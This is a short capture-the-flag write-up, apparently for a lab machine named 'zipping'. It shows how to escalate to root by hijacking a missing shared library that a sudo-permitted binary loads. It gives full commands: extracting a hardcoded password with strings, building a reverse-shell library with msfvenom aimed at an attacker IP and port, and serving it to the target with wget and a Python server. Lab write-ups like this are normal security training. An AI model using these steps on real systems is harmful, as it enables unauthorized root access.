# Privilege Escalation

sudo -l 

```
Matching Defaults entries for rektsu on zipping:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User rektsu may run the following commands on zipping:
    (ALL) NOPASSWD: /usr/bin/stock
```

`sudo /usr/bin/stock`
Enter Password:

so we need read the code using strings command

`strings /usr/bin/stock`

![](images/2024-01-15-22-52-46.png)

Here the password `St0ckM4nager`

now try login back and success but nothing here to exploit it so we need using strace command for debugging the code 

`strace /usr/bin/stock`

after that paste the password and enter then you will see at here "No such file"

![](images/2024-01-15-22-54-02.png)

```
openat(AT_FDCWD, "/home/rektsu/.config/libcounter.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
```

the file was missed now create malicious code revshell using name libcounter.so to priv esc and get revshell . Using metasploit to create revshell

`msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.49 LPORT=1337 -f elf-so -o libcounter.so`

So now go this path `/home/rektsu/.config/` and upload your shell have been created by metasploit 


## Your Linux

`python3 -m http.server 80`

## SSH / Revhsell
`wget http://10.10.14.49/libcounter.so`

now run your netcat on your linux terminal and run `sudo /usr/bin/stock`

And will get access root from the system because you added malicious file in libcounter.so file at .config because the binary `/usr/bin/stock` compile with this file libcounter.so and that's why this happened 

![](images/2024-01-15-22-54-59.png)